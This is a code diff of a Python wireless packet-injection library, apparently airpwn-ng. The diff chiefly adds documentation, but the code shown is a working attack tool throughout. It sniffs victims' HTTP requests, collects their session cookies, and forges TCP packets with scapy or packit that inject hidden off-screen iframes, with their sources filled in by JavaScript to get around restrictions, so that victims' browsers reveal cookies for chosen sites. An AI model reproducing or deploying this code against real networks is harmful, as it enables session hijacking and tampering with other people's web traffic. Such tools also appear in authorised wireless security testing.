@@ -1,3 +1,4 @@
+import cProfile
 from threading import Thread
 from Queue import Queue, Empty
 from scapy.all import *
@@ -16,13 +17,15 @@ class bcolors:
     BOLD = '\033[1m'
     UNDERLINE = '\033[4m'
 
-class VictimParameters:
-	'''
+'''
+VictimParameters class
+An instance of this class is always necessary to run
+the application, because it holds your injections.
 Define victim detection parameters.
 For targeted mode, this is a property of Victim.
 For broadcast mode, this is a property of PacketHandler
-
-	'''
+'''
+class VictimParameters:
 
 	def __init__(self,*positional_parameters, **keyword_parameters):
 		if ('websites' in keyword_parameters):
@@ -45,13 +48,6 @@ For broadcast mode, this is a property of PacketHandler
 		if (self.websites is None and self.inject_file is None and self.in_request is None):
 			print "[ERROR] Please specify victim parameters"
 			exit(1)
-#		if (self.websites is not None):
-#			self.website_injects=[]
-#			for website in self.websites:
-#				self.website_injects.append((website,self.get_iframe(website,"0")))
-#		if (self.inject_file is not None):
-#			self.file_inject=self.load_injection(self.inject_file)
-#			self.file_injected=0
 		if (self.in_request is not None and (self.websites is None and self.inject_file is None)):
 			print "[ERROR] You must select websites or an inject file for use with in_request"
 		else:
@@ -62,84 +58,95 @@ For broadcast mode, this is a property of PacketHandler
 			if (self.inject_file is not None):
 				self.file_inject=self.load_injection(self.inject_file)
 				self.file_injected=0
-
+	'''
+	Default request handler,
+	just checks if in_request string
+	is contained in the request
+	(i.e. in_request="Firefox")
+	'''
 	def default_request_handler(self,request):
 		if (self.in_request in request):
 			return True
 		else:
 			return False
+	'''
+	Generate hex string in packit format
+	from injection string
+	'''
+	def hex_injection(self,injection):
+		k=binascii.hexlify(injection)
+		n=2
+		inject="0x"
+		for item in [k[i:i+n] for i in range(0, len(k), n)]:
+			inject+=item+" "
+		return inject
 
+
+	'''
+	Process request, send it to custom
+	handler if set, otherwise use default
+	'''
 	def proc_in_request(self,request):
 		if (self.in_request_handler is not None):
 			return self.in_request_handler(request)
 		else:
 			return self.default_request_handler(request)
-
+	'''
+	Generate iframe HTML
+	'''
 	def create_iframe(self,website,id):
 	        iframe='''<iframe id="iframe'''+id+'''" width="1" scrolling="no" height="1" frameborder="0" src=""></iframe>\n'''
 	        return iframe
 
+	'''
+	Loads an injection from file if --injection is set
+	'''
 	def load_injection(self,injectionfile):
-	        #Check if file TEMPLOG exists, throw error if true, proceed if false
-	        proceed=0
-	        try:
-	                f = open('TEMPLOG','r')
-	                proceed=0
-	        except IOError:
-	                proceed=1
-	        if (proceed==0):
-	                print bcolors.WARNING+"[!] You have a file named TEMPLOG in this directory. Please rename it, as it is used by airpwn-ng for payload generation"
-	                exit(1)
 		f = open(injectionfile,'r')
 		try:
 			data=f.read()
 		finally:
 			f.close()
 		return data
-		#GZIP
-#		f = open(injectionfile,'r')
-#		try:
-#			data=f.read()
-#		finally:
-#			f.close()
-#		buf = StringIO()
-#		f = gzip.GzipFile(mode='wb', fileobj=buf)
-#		try:
-#			f.write(data)
-#		finally:
-#			f.close()
-#		compressed_data=buf.getvalue()
-#		k=binascii.hexlify(compressed_data)
-#		n=2
-#		inject="0x"
-#		for item in [k[i:i+n] for i in range(0, len(k), n)]:
-#			inject+=item+" "
-#		print inject
+		'''
+		#GZIP - NOT IMPLEMENTED YET
+		f = open(injectionfile,'r')
+		try:
+			data=f.read()
+		finally:
+			f.close()
+		buf = StringIO()
+		f = gzip.GzipFile(mode='wb', fileobj=buf)
+		try:
+			f.write(data)
+		finally:
+			f.close()
+		compressed_data=buf.getvalue()
+		k=binascii.hexlify(compressed_data)
+		n=2
+		inject="0x"
+		for item in [k[i:i+n] for i in range(0, len(k), n)]:
+			inject+=item+" "
+		print inject
+		'''
 
-
+	'''
+	Creates the final injection string when --websites is set
+	'''
 	def create_iframe_injection(self,injects):
 	        proceed=0
-	        try:
-	                f = open('INJECTS_TEMP','r')
-	                proceed=0
-	        except IOError:
-	                proceed=1
-	        if (proceed==0):
-	                print bcolors.WARNING+"[!] You have a file named INJECTS_TEMP in this directory. Please rename it, as it is used by airpwn-ng for payload generation"
-	                exit(1)
-	        f = open('INJECTS_TEMP','w')
-	        f.write('\n')
-	        f.write('''<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">\n''')
-	        f.write('''<html xmlns="http://www.w3.org/1999/xhtml">\n''')
-	        f.write('''<div style="position:absolute;top:-9999px;left:-9999px;visibility:collapse;">\n''')
-	        f.write(injects)
-	        f.write('</div>')
-	        f.close()
-	        injection=self.load_injection('INJECTS_TEMP')
-#	        os.system("cat INJECTS_TEMP")
-	        os.system("rm INJECTS_TEMP")
+	        f='\n'
+	        f+='''<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">\n'''
+	        f+='''<html xmlns="http://www.w3.org/1999/xhtml">\n'''
+	        f+='''<div style="position:absolute;top:-9999px;left:-9999px;visibility:collapse;">\n'''
+	        f+=injects
+	        f+='</div>'
+	        injection=f
 	        return injection
 
+	'''
+	iframe generation function, src filled in via JS
+	'''
 	def get_iframe(self,website,i):
                 #THIS GENERATES AN IFRAME WITH EMPTY SRC, TO BE FILLED IN LATER IN JAVASCRIPT TO BYPASS SOME RESTRICTIONS
                 iframes=self.create_iframe(website,str(i))
@@ -154,6 +161,12 @@ For broadcast mode, this is a property of PacketHandler
                 iframes+=''' }\n}\ntry{\nsetTimeout(setIframeSrc'''+str(i)+''', 10);\n} catch (err){\n}\n'''
                 iframes+='''</script>\n'''
                 injection=self.create_iframe_injection(iframes)
+#		k=binascii.hexlify(injection)
+#		n=2
+#		inject="0x"
+#		for item in [k[i:i+n] for i in range(0, len(k), n)]:
+#			inject+=item+" "
+#		injection=inject
 		return injection
 
 #	def load_inject_file(self):
@@ -161,11 +174,14 @@ For broadcast mode, this is a property of PacketHandler
 
 
 
-class Victim:
-	'''
+'''
 Victim class is your target, define it by setting ip or mac address
+It also needs an instance of VictimParameters, where you set what
+you want to inject per victim, allowing for different attacks per
+target.
 This class is used by PacketHandler class
-	'''
+'''
+class Victim:
 	def __init__(self,*positional_parameters, **keyword_parameters):
 		if ('ip' in keyword_parameters):
 			self.ip=keyword_parameters['ip']
@@ -190,7 +206,9 @@ This class is used by PacketHandler class
 			exit(1)
 
 		self.cookies=[]
-
+	'''
+	Returns injection for victim
+	'''
 	def get_injection(self):
 		#CASE: no in_request defined, return injections for --websites if defined, then --injection if defined
 		if (self.victim_parameters.in_request is None):
@@ -227,7 +245,9 @@ This class is used by PacketHandler class
 				if (self.victim_parameters.file_injected==0):
 					return self.victim_parameters.file_inject
 	
-
+	'''
+	Checks if cookie has already been captured
+	'''
 	def check_add_cookie(self,cookie):
 		exists=0
 		for existing_cookie in self.cookies:
@@ -239,11 +259,16 @@ This class is used by PacketHandler class
 			self.cookies.append(cookie)
 		else:
 			if (cookie[1]=="NONE"):
+				#ADD THE NONE ANYWAY COOKIE SO GET_INJECTION() CAN SKIP TO THE NEXT IFRAME
+				self.cookies.append(cookie)
 				if (self.ip is not None):
 					print bcolors.WARNING+"[!] No cookie on client",self.ip," for website",cookie[0]+bcolors.ENDC
 				else:
 					print bcolors.WARNING+"[!] No cookie on client",self.mac," for website",cookie[0]+bcolors.ENDC
-
+	'''
+	Cookie handling function, if --websites is set,
+	ignores all cookies for hosts other than specified
+	'''
 	def add_cookie(self,cookie):
 #		print cookie
 		if (self.victim_parameters.websites is not None):
@@ -253,14 +278,19 @@ This class is used by PacketHandler class
 		else:
 			self.check_add_cookie(cookie)
 
-class Injector:
-	'''
+'''
 Injector class, based on the interface selected,
 it uses scapy or packit to inject packets on the networks
-	'''
+'''
+class Injector:
 	def __init__(self,interface):
 		self.interface=interface
 
+	'''
+	inject function performs the actual injection, using
+	scapy for open networks (monitor-mode) and packit for
+	WEP/WPA injection
+	'''
 	def inject(self,vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,injection):
 		print bcolors.OKBLUE+"[*] Injecting Packet to victim "+vicmac+bcolors.ENDC
 		if ("mon" in self.interface):
@@ -270,6 +300,7 @@ it uses scapy or packit to inject packets on the networks
 			except:
 				raise
 		else:
+			## MEASURED THIS, TAKES ABOUT 1.45ms TO DO THIS FOR A 195 LINE INJECTION (WHICH IS BIG), ballsy FROM EXAMPLES TAKES 0.1ms ON AVERAGE SO IT'S PRETTY IRRELEVANT TIME-WISE
 			k=binascii.hexlify(injection)
 			n=2
 			inject="0x"
@@ -278,13 +309,18 @@ it uses scapy or packit to inject packets on the networks
 			injection=inject
 			cmd='nice -n -20 packit -i '+self.interface+' -R -nnn -a '+str(acknum)+' -D '+str(vicport)+' -F PA -q '+str(seqnum)+' -S '+str(svrport)+' -d '+vicip+' -s '+svrip+' -X '+rtrmac+' -Y '+vicmac+' -p "'
 			cmd+=injection
-			cmd+='" >/dev/null 2>&1'
+			cmd+='" >/dev/null 2>&1 &'
 			os.system(cmd)
 			#TODO: Send FIN to client + server to stop junk
 	#		print cmd
 		
 
-
+'''
+PacketHandler class
+This class does all the heavy-lifting. It has an optional Victims parameters that
+is a List of instances of Victim for targeted mode, or can be fed an instance of 
+VictimParameters directly if working in broadcast mode and attacking all clients.
+'''
 class PacketHandler:
 	def __init__(self,*positional_parameters, **keyword_parameters):
 		if ('victims' in keyword_parameters):
@@ -316,6 +352,12 @@ class PacketHandler:
 		self.newvictims=[]
 		self.injector=Injector(self.i)
 
+	'''
+	Looks for cookie in string returned by
+	PacketHandler.get_request(), returns
+	a List object [host,cookie] if there is
+	one, otherwise returns None
+	'''
 	def search_cookie(self,ret2):
 		if (len(ret2.strip())>0):
 			arr=ret2.split("\n")
@@ -337,7 +379,10 @@ class PacketHandler:
 		else:
 			return None
 
-
+	'''
+	Extracts request payload as string from packet object
+	if there is payload, otherwise returns None
+	'''
 	def get_request(self,pkt):
 		ret2 = "\n".join(pkt.sprintf("{Raw:%Raw.load%}\n").split(r"\r\n"))
 		if (len(ret2.strip())>0):
@@ -346,6 +391,10 @@ class PacketHandler:
 		else:
 			return None
 
+	'''
+	Default packet handler, looks for GET requests
+	in the TCP layer
+	'''
 	def handle_default(self,packet):
 		if (packet.haslayer(IP) and packet.haslayer(TCP)):
 			#MONITOR MODE
@@ -370,7 +419,10 @@ class PacketHandler:
 #			print (vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,request,cookie)
 			return (vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,request,cookie)
 
-
+	'''
+	This function does cookie management for broadcast mode
+	and targeted mode.
+	'''
 	def cookie_mgmt(self,vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,request,cookie):
 		if (len(self.victims)==0):
 			try:
@@ -451,7 +503,13 @@ class PacketHandler:
 								if (victim.mac.lower()==vicmac.lower()):
 									victim.add_cookie(cookie)
 					
-
+	'''
+	Process injection function, uses the PacketHandler.victims List
+	if it was set, to check if the packet belongs to any of the targets.
+	If no victims List is set, meaning it's in broadcast mode, it checks
+	for the victim in PacketHandler.newvictims and gets the injection for
+	it, if there is one, and injects it via Injector.inject()
+	'''
 	def proc_injection(self,vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,request,cookie):
 		if (len(self.victims)==0):
 			if (self.victim_parameters.in_request is not None):
@@ -501,6 +559,14 @@ class PacketHandler:
 							injection=victim.get_injection()
 							if (injection is not None):
 								self.injector.inject(vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,injection)
+
+	'''
+	Process packets coming from the sniffer.
+	You can override the handler with one of your own,
+	that you can use for any other packet type (e.g DNS),
+	otherwise it uses the default packet handler looking
+	for GET requests for injection and cookies
+	'''
 	def process(self,interface,pkt):
 		#You can write your own handler for packets
 		if (self.handler is not None):
@@ -514,7 +580,12 @@ class PacketHandler:
 			self.cookie_mgmt(vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,request,cookie)
 			self.proc_injection(vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,request,cookie)
 
-	
+'''
+Sniffer class
+This is the most high-level object from the library,
+using an instance of PacketHandler as the processing engine
+for packets received from scapy's sniff() function
+'''
 class Sniffer:
 	def __init__(self,packethandler,*positional_parameters, **keyword_parameters):
 		if ('filter' in keyword_parameters):
@@ -532,13 +603,23 @@ class Sniffer:
 			if ("mon" not in self.m):
 				print "[WARN] SNIFFER: Filter empty for non-monitor interface"
 		self.packethandler=packethandler
-
+	'''
+	Target function for Queue (multithreading),
+	usually we set a filter for GET requests on
+	the dot11 tap interface, but it can also be
+	an empty string
+	'''
 	def sniff(self,q):
 		if ("mon" in self.m):
 			sniff(iface = self.m, prn = lambda x : q.put(x))
 		else:
 			sniff(iface = self.m,filter = self.filter, prn = lambda x : q.put(x))
 
+	'''
+	This starts a Queue which receives packets and processes them
+	using the PacketHandler.process function.
+	Call this function to begin actual sniffing+injection
+	'''
 	def threaded_sniff(self):
 		q = Queue(200)
 		sniffer = Thread(target = self.sniff, args=(q,))
@@ -551,3 +632,6 @@ class Sniffer:
 				q.task_done()
 			except Empty:
 				pass
+
+
+
